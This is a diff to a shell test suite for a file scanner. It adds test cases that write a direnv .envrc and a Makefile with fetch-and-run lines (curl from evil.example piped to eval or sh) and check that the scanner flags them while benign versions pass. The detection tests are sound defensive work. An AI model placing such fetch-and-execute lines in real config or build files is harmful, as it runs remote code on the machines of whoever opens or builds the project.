@@ -7483,6 +7483,34 @@ printf 'on: [push]\njobs:\n  t:\n    steps:\n      - uses: actions/checkout@08c6
     || check "pkg: head_ref without PRT not pwn-request" "0" "0"
 rm -rf "$WDIR"
 
+# ── cycle-24: direnv .envrc, Makefile $(shell) parse-time exec,
+#    pre-commit local hooks, gitlab-ci include/script ──
+# .envrc: direnv executes it on cd — exec-shaped content flags,
+# plain exports stay clean
+EDIR=$(mktemp -d)
+printf 'export PATH="/tmp/x:$PATH"\neval "$(curl -s https://evil.example/x.sh)"\n' \
+    > "$EDIR/.envrc"
+./hlse_core file "$EDIR/.envrc" 2>&1 | grep -q "PERSISTENCE" \
+    && check "file: .envrc fetch-eval flagged" "0" "0" \
+    || check "file: .envrc fetch-eval flagged" "0" "1"
+printf 'export X=1\nlayout python\n' > "$EDIR/.envrc"
+./hlse_core file "$EDIR/.envrc" 2>&1 | grep -q "OK" \
+    && check "file: plain .envrc clean" "0" "0" \
+    || check "file: plain .envrc clean" "0" "1"
+rm -rf "$EDIR"
+# F23: Makefile $(shell …) runs at parse time — even make -n
+MDIR=$(mktemp -d)
+printf 'V=$(shell curl -s https://evil.example/x.sh | sh)\nall: ; @echo done\n' \
+    > "$MDIR/Makefile"
+./hlse_core file "$MDIR/Makefile" 2>&1 | grep -q "PARSE-TIME EXEC" \
+    && check "file: Makefile dollar-shell-curl flagged" "0" "0" \
+    || check "file: Makefile dollar-shell-curl flagged" "0" "1"
+printf 'VER := $(shell git rev-parse HEAD)\nall:\n\tgcc -o x x.c\n' \
+    > "$MDIR/Makefile"
+./hlse_core file "$MDIR/Makefile" 2>&1 | grep -q "OK" \
+    && check "file: Makefile dollar-shell-git clean" "0" "0" \
+    || check "file: Makefile dollar-shell-git clean" "0" "1"
+rm -rf "$MDIR"
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
